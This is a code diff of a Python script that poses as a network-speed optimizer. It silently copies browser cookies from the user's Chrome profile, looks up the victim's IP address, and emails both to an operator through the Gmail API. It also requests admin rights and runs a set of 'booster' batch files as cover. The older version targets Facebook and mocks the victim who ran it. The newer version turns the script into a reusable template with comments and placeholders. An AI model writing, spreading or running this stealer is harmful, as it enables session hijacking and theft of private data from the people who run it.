@@ -15,11 +15,12 @@ from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.chrome.options import Options
 from webdriver_manager.chrome import ChromeDriverManager
 
-
+### Send cookies
+# Required scope for using Gmail API
 SCOPES = ['https://www.googleapis.com/auth/gmail.send']
 
-CREDENTIALS_FILE = 'build/main/CDT_Main.json'
-TOKEN_FILE = 'build/main/Tokn_PCB.json'
+CREDENTIALS_FILE = 'credentials.json'
+TOKEN_FILE = 'token.json'
 
 def get_credentials():
     creds = None
@@ -39,65 +40,87 @@ def send_email_via_gmail_api(subject, body, to_email, file_path):
     creds = get_credentials()
     service = build('gmail', 'v1', credentials=creds)
 
+    # Create email content
     msg = EmailMessage()
     msg['Subject'] = subject
-    msg['From'] = 'xxx'
+    msg['From'] = 'xxx@gmail.com'
     msg['To'] = to_email
     msg.set_content(body)
 
+    # Attach file if it exists
+    if os.path.exists(file_path):
+        with open(file_path, 'rb') as f:
+            file_data = f.read()
+            file_name = os.path.basename(file_path)
+            msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
+
+    # Encode email content to base64 format
     encoded_message = base64.urlsafe_b64encode(msg.as_bytes()).decode()
 
+    # Send email via Gmail API
     try:
         message = {
             'raw': encoded_message
         }
         send_result = service.users().messages().send(userId="me", body=message).execute()
-        print(f"successfully! ID: {send_result['id']}")
+        print(f"Successfully! ID: {send_result['id']}")
     except Exception as error:
         print(f"An error occurred: {error}")
-        
-                                    #############################
-                                    
+
+#############################
+
+# Get the current username on Windows
 username = os.getlogin()
 
+# Create an Options object to configure the browser
 chrome_options = Options()
 chrome_options.add_argument(f"user-data-dir=C:/Users/{username}/AppData/Local/Google/Chrome/User Data")
-chrome_options.add_argument("profile-directory=Default")  
-chrome_options.add_argument("--headless") 
-chrome_options.add_argument("--no-sandbox")  
-chrome_options.add_argument("--disable-dev-shm-usage")  
+chrome_options.add_argument("profile-directory=Default")  # Or another profile name if needed
+chrome_options.add_argument("--headless")  # Run in headless mode
+chrome_options.add_argument("--no-sandbox")  # This option may help avoid some issues
+chrome_options.add_argument("--disable-dev-shm-usage")  # This option helps to resolve memory issues
 
+# Initialize the browser with the configuration
 driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
 
-driver.get("https://facebook.com")
-cookies = driver.get_cookies()
-driver.quit()
+# Open the website
+driver.get("https://xxx.com")
 
+# Get cookies
+cookies = driver.get_cookies()
+
+# Convert cookies to JSON string
 cookies_json = json.dumps(cookies)
 
-                                    #############################
-                                    
+#############################
+
+# Get user's IP address
 def get_ip():
     url = "https://ipinfo.io"
     try:
         response = requests.get(url)
         data = response.json()
-        return data.get("ip"), "None" 
+        return data.get("ip"), "None"  # Return IP and error as "None" if no error
     except requests.RequestException as e:
-        return None, f"Lỗi khi lấy địa chỉ IP: {e}"
+        return None, f"Error getting IP address: {e}"
 
+# Get IP address and error if any
 ipv4_ipv6, Err = get_ip()
 
-                                    #############################
-                                    
+#############################
+
+# Send email
 send_email_via_gmail_api(
     subject='Cookies Data',
-    body= f"Đã có thằng ngu bấm chạy heeheee \n\nIP: {ipv4_ipv6}\nLỗi: {Err}\n\n{cookies_json}", 
-    to_email='bvdoanpt18@gmail.com',
-    file_path=None  
+    body=f"Write something \n\nIP: {ipv4_ipv6}\nError: {Err}\n\n{cookies_json}", 
+    to_email='your_mail@gmail.com',
+    file_path=None  # No need to attach a file
 )
-                                    #############################
-                                    
+
+#############################
+
+### Fake
+# Request admin rights for the Python script
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
@@ -105,24 +128,22 @@ def is_admin():
         return False
 
 if is_admin():
-    bat_files = [
-        "Clear DNS.bat", 
-        "Decrease Ping.bat", 
-        "Fix Network Lag, Spikes.bat",
-        "Increase Internet Speed.bat",
-        "Ping Stable.bat",
-        "Remove Bandwidth Limit.bat",
-        "Reset Network Cache.bat",
-        "Reset network Winsock.bat",
-        "Stop Network Throttling Command.bat",
-        "TCP Commands.bat",
-        "TCP Global Netsh.bat",
-        "YouTube Buffer Decrease.bat"
-    ]
-    
+    bat_files = ["Clear DNS.bat", 
+                 "Decrease Ping.bat", 
+                 "Fix Network Lag, Spikes.bat",
+                 "Increase Internet Speed.bat",
+                 "Ping Stable.bat",
+                 "Remove Bandwidth Limit.bat",
+                 "Reset Network Cache.bat",
+                 "Reset network Winsock.bat",
+                 "Stop Network Throttling Command.bat",
+                 "TCP Commands.bat",
+                 "TCP Global Netsh.bat",
+                 "YouTube Buffer Decrease.bat"]
     processes = []
     
     for bat_file in bat_files:
+        # Run the .bat file in separate processes
         process = subprocess.Popen(bat_file, shell=True)
         processes.append(process)
     
@@ -130,4 +151,5 @@ if is_admin():
         process.wait()
     
 else:
+    # Restart the script with admin rights if not already
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
